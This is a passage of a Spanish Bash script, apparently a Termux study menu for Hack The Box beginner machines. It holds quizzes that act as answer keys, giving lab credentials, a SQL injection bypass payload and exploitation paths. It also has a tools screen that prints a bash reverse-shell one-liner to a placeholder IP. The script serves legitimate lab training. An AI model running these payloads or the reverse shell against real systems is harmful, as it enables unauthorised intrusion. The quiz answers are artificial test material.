  pregunta "¿Qué servicio es la vía de entrada?" "FTP (21)" "SSH (22)" "Telnet (23)" "SMB (445)"
  pregunta "¿Qué usuario permite el acceso?" "anonymous" "root" "admin" "ftpuser"
  pregunta "¿Qué comando usas?" "ftp $RHOST" "telnet $RHOST" "ssh $RHOST" "smbclient -L //$RHOST"
  resumen_quiz "fawn"
}

rm_dancing_quiz() {
  QUIZ_OK=0; QUIZ_TOTAL=0; QUIZ_FALLOS=0
  msg "Reto — Dancing"
  pregunta "¿Qué servicio es la vía de entrada?" "SMB (445)" "FTP (21)" "Telnet (23)" "MySQL (3306)"
  pregunta "¿Qué herramienta usas para enumerar?" "smbclient" "ftp" "redis-cli" "curl"
  pregunta "¿Cómo listas los shares?" "smbclient -L //$RHOST -N" "smbclient //$RHOST -N" "showmount -e $RHOST" "nc -l 445"
  resumen_quiz "dancing"
}

rm_redeemer_quiz() {
  QUIZ_OK=0; QUIZ_TOTAL=0; QUIZ_FALLOS=0
  msg "Reto — Redeemer"
  pregunta "¿Qué servicio es la vía de entrada?" "Redis (6379)" "MySQL (3306)" "FTP (21)" "SMB (445)"
  pregunta "¿Qué herramienta usas?" "redis-cli" "mysql" "smbclient" "ftp"
  pregunta "¿Cómo te conectas?" "redis-cli -h $RHOST" "redis-cli $RHOST" "nc -l 6379" "mysql -h $RHOST"
  resumen_quiz "redeemer"
}

rm_appointment_quiz() {
  QUIZ_OK=0; QUIZ_TOTAL=0; QUIZ_FALLOS=0
  msg "Reto — Appointment"
  pregunta "¿Qué vulnerabilidad tiene el login?" "Inyección SQL" "XSS" "LFI" "Command injection"
  pregunta "¿Qué payload hace el bypass?" "admin' or 1=1-- -" "admin:admin" "<script>alert(1)</script>" "../../etc/passwd"
  pregunta "¿Qué herramienta automatiza el SQLi?" "sqlmap" "hydra" "gobuster" "nmap"
  resumen_quiz "appointment"
}

rm_sequel_quiz() {
  QUIZ_OK=0; QUIZ_TOTAL=0; QUIZ_FALLOS=0
  msg "Reto — Sequel"
  pregunta "¿Qué servicio es la vía de entrada?" "MySQL (3306)" "Redis (6379)" "FTP (21)" "SMB (445)"
  pregunta "¿Qué credenciales funcionan?" "root sin contraseña" "root:toor" "admin:admin" "anonymous"
  pregunta "¿Cómo te conectas?" "mysql -h $RHOST -u root" "mysql $RHOST -u admin" "redis-cli -h $RHOST" "nc $RHOST 3306"
  resumen_quiz "sequel"
}

rm_crocodile_quiz() {
  QUIZ_OK=0; QUIZ_TOTAL=0; QUIZ_FALLOS=0
  msg "Reto — Crocodile"
  pregunta "¿De dónde salen las credenciales?" "FTP anónimo (allowed.userlist)" "SMB null session" "SQLi" "Redis sin auth"
  pregunta "¿Qué credenciales se usan en la web?" "arron:P4ssw0rd" "admin:qwerty123" "tomcat:s3cret" "prtgadmin:prtgadmin"
  pregunta "¿Qué haces tras el login?" "Subir una webshell PHP" "Cambiar la contraseña" "Descargar la flag" "Abrir un túnel SSH"
  resumen_quiz "crocodile"
}

rm_responder_quiz() {
  QUIZ_OK=0; QUIZ_TOTAL=0; QUIZ_FALLOS=0
  msg "Reto — Responder"
  pregunta "¿Qué quieres robar?" "El hash NTLM" "La flag" "La base de datos" "La clave SSH"
  pregunta "¿Qué herramienta envenena la red?" "Responder" "sqlmap" "gobuster" "hydra"
  pregunta "¿Cómo fuerzas la autenticación?" "Parámetro page hacia //tuIP/share" "Un XSS en el login" "Un escaneo nmap" "Un upload PHP"
  resumen_quiz "responder"
}

rm_three_quiz() {
  QUIZ_OK=0; QUIZ_TOTAL=0; QUIZ_FALLOS=0
  msg "Reto — Three"
  pregunta "¿Qué servicio secundario encuentras?" "Bucket S3 / MinIO" "Redis" "MySQL" "Tomcat"
  pregunta "¿Cómo listas el bucket?" "aws s3 ls --endpoint-url http://s3.thetoppers.htb" "smbclient -L //s3.thetoppers.htb" "curl http://s3.thetoppers.htb/flag" "ftp s3.thetoppers.htb"
  pregunta "¿Qué subes para ejecutar código?" "Una webshell PHP al bucket" "Un archivo zip" "Un WAR" "Un hash"
  resumen_quiz "three"
}

rm_ignition_quiz() {
  QUIZ_OK=0; QUIZ_TOTAL=0; QUIZ_FALLOS=0
  msg "Reto — Ignition"
  pregunta "¿Qué CMS corre en la web?" "Magento" "WordPress" "Joomla" "PrestaShop"
  pregunta "¿Qué credenciales por defecto usa el panel?" "admin:qwerty123" "admin:admin" "tomcat:s3cret" "root:toor"
  pregunta "¿Dónde está la flag?" "En el panel de administración" "En /etc/passwd" "En el FTP" "En la base de datos"
  resumen_quiz "ignition"
}

rm_archetype_quiz() {
  QUIZ_OK=0; QUIZ_TOTAL=0; QUIZ_FALLOS=0
  msg "Reto — Archetype"
  pregunta "¿Qué share filtra la configuración?" "backups" "WorkShares" "ADMIN$" "IPC$"
  pregunta "¿Qué base de datos se expone?" "MSSQL (1433)" "MySQL (3306)" "PostgreSQL (5432)" "Redis (6379)"
  pregunta "¿Cómo escalas a Administrator?" "psexec con las creds del historial de PowerShell" "sudo vi" "PATH hijack" "Log4Shell"
  resumen_quiz "archetype"
}

rm_oopsie_quiz() {
  QUIZ_OK=0; QUIZ_TOTAL=0; QUIZ_FALLOS=0
  msg "Reto — Oopsie"
  pregunta "¿Cuál es el vector inicial?" "Subida de webshell" "SMB null session" "Redis sin auth" "Log4Shell"
  pregunta "¿Qué binario SUID encuentras?" "/usr/bin/bugtracker" "/usr/bin/sudo" "/bin/cat" "/usr/bin/python3"
  pregunta "¿Cómo escalas privilegios?" "PATH hijack con un 'cat' falso" "sudo vi" "MS17-010" "Fuerza bruta SSH"
  resumen_quiz "oopsie"
}

rm_vaccine_quiz() {
  QUIZ_OK=0; QUIZ_TOTAL=0; QUIZ_FALLOS=0
  msg "Reto — Vaccine"
  pregunta "¿Qué archivo descargas del FTP?" "backup.zip" "index.php" "flag.txt" "config.php"
  pregunta "¿Cuál es la contraseña del zip?" "741852963" "qwerty123" "P4ssw0rd" "s3cret"
  pregunta "¿Cómo escalas a root?" "sudo vi" "sudo su" "PATH hijack" "PrintSpoofer"
  resumen_quiz "vaccine"
}

rm_unified_quiz() {
  QUIZ_OK=0; QUIZ_TOTAL=0; QUIZ_FALLOS=0
  msg "Reto — Unified"
  pregunta "¿Qué vulnerabilidad explotas?" "Log4Shell (Log4j)" "EternalBlue" "Shellshock" "Heartbleed"
  pregunta "¿En qué campo inyectas?" "remember" "username" "password" "search"
  pregunta "¿Qué protocolo usa el payload?" "JNDI/LDAP" "SMB" "FTP" "RDP"
  resumen_quiz "unified"
}

rm_jerry_quiz() {
  QUIZ_OK=0; QUIZ_TOTAL=0; QUIZ_FALLOS=0
  msg "Reto — Jerry"
  pregunta "¿Qué servicio es la vía de entrada?" "Tomcat (8080)" "IIS (80)" "MySQL (3306)" "Redis (6379)"
  pregunta "¿Qué credenciales por defecto tiene el manager?" "tomcat:s3cret" "admin:admin" "root:toor" "jerry:jerry"
  pregunta "¿Qué despliegas para obtener shell?" "Un WAR malicioso" "Un archivo .htaccess" "Un zip" "Una imagen"
  resumen_quiz "jerry"
}

rm_blue_quiz() {
  QUIZ_OK=0; QUIZ_TOTAL=0; QUIZ_FALLOS=0
  msg "Reto — Blue"
  pregunta "¿Qué vulnerabilidad explotas?" "MS17-010 (EternalBlue)" "MS08-067" "Log4Shell" "Shellshock"
  pregunta "¿Qué herramienta usas?" "Metasploit" "sqlmap" "gobuster" "hydra"
  pregunta "¿Qué requisito necesita el exploit?" "SMBv1 activo (Windows 7)" "Un servidor Linux" "Puerto 80 abierto" "Credenciales válidas"
  resumen_quiz "blue"
}

rm_buff_quiz() {
  QUIZ_OK=0; QUIZ_TOTAL=0; QUIZ_FALLOS=0
  msg "Reto — Buff"
  pregunta "¿Qué aplicación web corre en el 8080?" "Gym Management System" "Magento" "Tomcat" "PRTG"
  pregunta "¿Qué servicio local explotas para escalar?" "CloudMe 1.11.2 en localhost:8888" "MySQL en 3306" "Redis en 6379" "SMB en 445"
  pregunta "¿Qué usas para llegar al puerto local?" "chisel (port forwarding)" "sqlmap" "gobuster" "hydra"
  resumen_quiz "buff"
}

rm_netmon_quiz() {
  QUIZ_OK=0; QUIZ_TOTAL=0; QUIZ_FALLOS=0
  msg "Reto — Netmon"
  pregunta "¿Dónde encuentras las credenciales?" "PRTG Configuration.old.bak por FTP" "En el index.php" "En el SMB share" "En Redis"
  pregunta "¿Qué función de PRTG explotas?" "Notificación con 'Execute Program'" "El login por defecto" "El upload de imágenes" "El backup automático"
  pregunta "¿Cómo entras al final?" "WinRM (evil-winrm)" "SSH" "RDP" "FTP"
  resumen_quiz "netmon"
}

rm_devel_quiz() {
  QUIZ_OK=0; QUIZ_TOTAL=0; QUIZ_FALLOS=0
  msg "Reto — Devel"
  pregunta "¿Qué permiso tiene el FTP anónimo?" "Escritura en el webroot" "Solo lectura" "Ninguno" "Solo en /tmp"
  pregunta "¿Qué tipo de archivo subes?" ".aspx" ".php" ".war" ".zip"
  pregunta "¿Cómo escalas privilegios?" "SeImpersonate (PrintSpoofer/JuicyPotato)" "sudo vi" "PATH hijack" "Log4Shell"
  resumen_quiz "devel"
}

# ------------------------------------------------------------
# Listado / navegación
# ------------------------------------------------------------
resolver() {
  local sel="${1,,}" i
  if [[ "$sel" =~ ^[0-9]+$ ]]; then
    i=$((10#$sel - 1))
    if [ "$i" -ge 0 ] && [ "$i" -lt "${#IDX[@]}" ]; then
      printf '%s' "${IDX[$i]}"
      return 0
    fi
    return 1
  fi
  for i in "${IDX[@]}"; do
    [ "$i" = "$sel" ] && {
      printf '%s' "$i"
      return 0
    }
  done
  return 1
}

listar() {
  local i=0 id
  linea
  printf '  %s%-4s %-12s %-30s %-8s %s%s\n' "$D" "#" "MÁQUINA" "TIER" "OS" "DIFICULTAD" "$N"
  linea
  for id in "${IDX[@]}"; do
    i=$((i + 1))
    printf '  %s[%2d]%s %-12s %s%-30s%s %-8s %s%s%s\n' \
      "$Y" "$i" "$N" "${M_NAME[$id]}" "$D" "${M_TIER[$id]}" "$N" \
      "${M_OS[$id]}" "$C" "${M_DIFF[$id]}" "$N"
  done
  linea
}

ver_progreso() {
  banner
  local id f hechas=0 total=0 flag
  printf '  %sPROGRESO · MÁQUINAS COMPLETADAS%s\n' "$W" "$N"
  linea
  for id in "${IDX[@]}"; do
    total=$((total + 1))
    f="$NOTAS/$id.md"
    if [ -f "$f" ] && grep -q '^- flag:' "$f"; then
      hechas=$((hechas + 1))
      flag=$(sed -n 's/^- flag: //p' "$f" | head -n 1)
      printf '  %s[x]%s %-12s %s%s%s\n' "$G" "$N" "${M_NAME[$id]}" "$D" "$flag" "$N"
    else
      printf '  %s[ ]%s %-12s\n' "$D" "$N" "${M_NAME[$id]}"
    fi
  done
  linea
  printf '  Completadas: %s%s/%s%s\n' "$G" "$hechas" "$total" "$N"
  pausa
}

abrir_notas() {
  local id="$1" f="$NOTAS/$id.md"
  crear_notas "$id"
  if command -v "${EDITOR:-nano}" >/dev/null 2>&1; then
    "${EDITOR:-nano}" "$f"
  elif command -v vi >/dev/null 2>&1; then
    vi "$f"
  else
    aviso "No hay editor. Tus notas están en: $f"
    tenue "Termux: pkg install nano"
  fi
}

menu_maquina() {
  local id="$1" op
  while :; do
    banner
    printf '  %s%s%s   %s(%s · %s)%s\n' "$W" "${M_NAME[$id]}" "$N" \
      "$D" "${M_DIFF[$id]}" "${M_OS[$id]}" "$N"
    printf '  %s%s%s\n' "$D" "${M_TIER[$id]}" "$N"
    printf '  Puertos: %s%s%s\n' "$C" "${M_PORTS[$id]}" "$N"
    printf '  Tags:    %s%s%s\n\n' "$D" "${M_TAGS[$id]}" "$N"
    printf '  %s[1]%s Recon automatizado\n' "$Y" "$N"
    printf '  %s[2]%s Pistas / pasos manuales\n' "$Y" "$N"
    printf '  %s[3]%s Reto: preguntas + flag\n' "$Y" "$N"
    printf '  %s[4]%s Todo (recon + pistas)\n' "$Y" "$N"
    printf '  %s[5]%s Notas de la máquina\n' "$Y" "$N"
    printf '  %s[6]%s Cambiar IP objetivo\n' "$Y" "$N"
    printf '  %s[0]%s Volver\n' "$R" "$N"
    printf '\n  Objetivo actual: %s%s%s\n' "$G" "${RHOST:-<sin definir>}" "$N"
    printf '  Opción > '
    IFS= read -r op || return
    case "$op" in
      1) pedir_objetivo && { printf '\n'; "rm_${id}_recon"; pausa; } ;;
      2) pedir_objetivo && { printf '\n'; "rm_${id}_pistas"; pausa; } ;;
      3) pedir_objetivo && {
        if declare -F "rm_${id}_quiz" >/dev/null 2>&1; then
          printf '\n'
          "rm_${id}_quiz"
        else
          aviso "Esta máquina todavía no tiene reto."
        fi
        pausa
      } ;;
      4) pedir_objetivo && { printf '\n'; "rm_${id}_recon"; printf '\n'; "rm_${id}_pistas"; pausa; } ;;
      5) abrir_notas "$id" ;;
      6) printf '  Nueva IP: '; IFS= read -r RHOST || true ;;
      0 | q | Q) return ;;
      *) aviso "Opción no válida" ;;
    esac
  done
}

abrir_maquina() {
  local id
  id="$(resolver "$1")" || {
    error "No encuentro la máquina '$1'"
    pausa
    return
  }
  menu_maquina "$id"
}

herramientas() {
  banner
  printf '  %sHERRAMIENTAS · TERMUX / KALI%s\n' "$W" "$N"
  linea
  printf '  %sTu IP (tun0/LAN):%s %s\n\n' "$D" "$N" "$(ip_local)"

  printf '  %sBásicos%s\n' "$C" "$N"
  tenue "pkg install nmap netcat-openbsd curl wget git openssh nano"
  tenue "pkg install python mariadb redis ftp"
  tenue "pip install sqlmap awscli impacket"

  printf '\n  %sWeb / SMB / AD%s\n' "$C" "$N"
  tenue "pkg install gobuster ffuf"
  tenue "smbclient / responder / msfconsole → Kali con proot-distro:"
  tenue "  pkg install proot-distro && proot-distro install kali"
  tenue "  proot-distro login kali"
  tenue "  apt install smbclient sqlmap metasploit-framework"

  printf '\n  %sDominios sin root%s\n' "$C" "$N"
  tenue "Termux no puede editar /etc/hosts. Usa --resolve:"
  tenue "  curl --resolve unika.htb:80:IP http://unika.htb/"
  tenue "Dentro de proot (Kali): echo 'IP unika.htb' >> /etc/hosts"

  printf '\n  %sReverse shells%s\n' "$C" "$N"
  tenue "Escucha:  nc -lvnp 4444"
  tenue "Bash:     bash -i >& /dev/tcp/TU_IP/4444 0>&1"
  tenue "Mejora TTY: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
  tenue "           Ctrl+Z → stty raw -echo; fg → export TERM=xterm"

  printf '\n  %sAviso:%s solo en labs (HTB) o sistemas propios.\n' "$R" "$N"
  printf '  %sComparte el script, no el acceso a otras máquinas.%s\n' "$D" "$N"
  pausa
}

ayuda() {
  cat <<'TXT'
MR.ROBOTTICO · HTB FÁCIL — comunidad Termux
Menú de un solo archivo para máquinas "Very Easy" de Hack The Box.

Uso:
  bash MR.Robottico_facil.sh              menú interactivo
  ./MR.Robottico_facil.sh                 igual, si tiene permiso +x
  ./MR.Robottico_facil.sh -t 10.10.10.5   fija la IP objetivo
  ./MR.Robottico_facil.sh -l              lista las máquinas
  ./MR.Robottico_facil.sh -m meow -p      pistas de Meow
  ./MR.Robottico_facil.sh -m meow -q      reto: preguntas + flag
  ./MR.Robottico_facil.sh -m dancing -r -t IP        recon (pregunta)
  ./MR.Robottico_facil.sh -m dancing -r -t IP -y     recon sin preguntar

Opciones:
  -t, --target IP     IP de la máquina HTB
  -m, --maquina ID    id del módulo (meow, fawn, dancing...)
  -r, --recon         lanzar reconocimiento del módulo
  -p, --pistas        mostrar pistas/pasos del módulo
  -q, --quiz          reto: preguntas y luego pide la flag
  -l, --lista         listar máquinas
  -y, --si            no preguntar antes de ejecutar
  -h, --ayuda         esta ayuda

Termux:  pkg install nmap netcat-openbsd curl
Kali en Termux:  pkg install proot-distro && proot-distro install kali

Aviso: úsalo solo en Hack The Box o en sistemas propios.
TXT
}

principal() {
  local sel
  while :; do
    banner
    printf '  Objetivo: %s%s%s\n\n' "$G" "${RHOST:-<sin definir>}" "$N"
    listar
    printf '  %s[H]%s Herramientas / Termux   %s[P]%s Progreso   %s[0]%s Salir\n' "$Y" "$N" "$Y" "$N" "$R" "$N"
    printf '\n  Máquina (número o nombre) > '
    IFS= read -r sel || break
    case "$sel" in
      0 | q | Q | salir) break ;;
      h | H | herramientas) herramientas ;;
      p | P | progreso) ver_progreso ;;
      "") continue ;;
      *) abrir_maquina "$sel" ;;
    esac
  done
  printf '\n  %s¡Suerte en el lab, comunidad Termux!%s\n\n' "$G" "$N"
}

# ------------------------------------------------------------
# Argumentos
# ------------------------------------------------------------
while [ $# -gt 0 ]; do
  case "$1" in
    -t | --target)
      [ $# -ge 2 ] || { error "Falta la IP tras $1"; exit 1; }
      RHOST="$2"
      shift 2
      ;;
    -m | --maquina)
      [ $# -ge 2 ] || { error "Falta el nombre tras $1"; exit 1; }
      MAQ="$2"
      shift 2
      ;;
    -r | --recon) ACCION="recon"; shift ;;
    -p | --pistas) ACCION="pistas"; shift ;;
    -q | --quiz) ACCION="quiz"; shift ;;
    -l | --lista) LISTAR=1; shift ;;
    -y | --si) AUTO=1; shift ;;
    -h | --ayuda) ayuda; exit 0 ;;
    *)
      error "Opción desconocida: $1 (usa -h)"
      exit 1
      ;;
  esac
done

MAQ="${MAQ:-}"
ACCION="${ACCION:-}"
LISTAR="${LISTAR:-0}"

if [ "$LISTAR" -eq 1 ]; then
  listar
  exit 0
fi

if [ -n "$MAQ" ]; then
  id="$(resolver "$MAQ")" || {
    error "No existe la máquina '$MAQ' (prueba -l)"
    exit 1
  }
  pedir_objetivo || exit 1
  printf '\n'
  RC=0
  case "$ACCION" in
    recon) "rm_${id}_recon"; RC=$? ;;
    pistas) "rm_${id}_pistas"; RC=$? ;;
    quiz)
      if declare -F "rm_${id}_quiz" >/dev/null 2>&1; then
        "rm_${id}_quiz"
        RC=$?
      else
        error "La máquina '$id' todavía no tiene reto"
        RC=1
      fi
      ;;
    "") "rm_${id}_recon"; RC=$?; printf '\n'; "rm_${id}_pistas" ;;
    *) error "Acción desconocida: $ACCION"; exit 1 ;;
  esac
  exit "$RC"
fi

pedir_objetivo || true
principal
